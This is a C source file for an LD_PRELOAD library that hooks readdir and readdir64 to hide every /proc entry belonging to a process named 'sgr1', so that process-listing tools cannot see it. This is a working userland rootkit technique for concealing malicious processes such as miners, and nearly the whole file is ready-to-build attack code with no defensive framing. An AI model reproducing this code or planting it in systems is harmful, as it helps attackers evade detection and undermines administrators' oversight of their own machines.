#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

/*
 * Every process with this name will be excluded
 */
static const char* process_to_filter = "sgr1";

/*
 * Get a directory name given a DIR* handle
 */
static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if (fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size - 1); // Ensure space for null terminator
    if (ret == -1) {
        return 0;
    }

    buf[ret] = '\0';
    return 1;
}

/*
 * Get a process name given its pid
 */
static int get_process_name(const char* pid, char* buf, size_t size)
{
    if (strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
 
    FILE* f = fopen(tmp, "r");
    if (f == NULL) {
        return 0;
    }

    if (fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }

    fclose(f);

    int unused;
    if (sscanf(tmp, "%d (%[^)])", &unused, buf) != 2) {
        return 0;
    }

    return 1;
}

#define DECLARE_READDIR(dirent, readdir)                                \
static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
                                                                        \
struct dirent* readdir(DIR *dirp)                                       \
{                                                                       \
    if (original_##readdir == NULL) {                                    \
        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
        if (original_##readdir == NULL) {                                \
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
            return NULL;                                                \
        }                                                               \
    }                                                                   \
                                                                        \
    struct dirent* dir;                                                 \
                                                                        \
    while ((dir = original_##readdir(dirp)) != NULL) {                  \
        char dir_name[256];                                             \
        char process_name[256];                                         \
        if (get_dir_name(dirp, dir_name, sizeof(dir_name)) &&          \
            strcmp(dir_name, "/proc") == 0 &&                         \
            get_process_name(dir->d_name, process_name, sizeof(process_name)) && \
            strcmp(process_name, process_to_filter) == 0) {             \
            continue;                                                   \
        }                                                               \
        return dir;                                                     \
    }                                                                   \
    return NULL;                                                        \
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
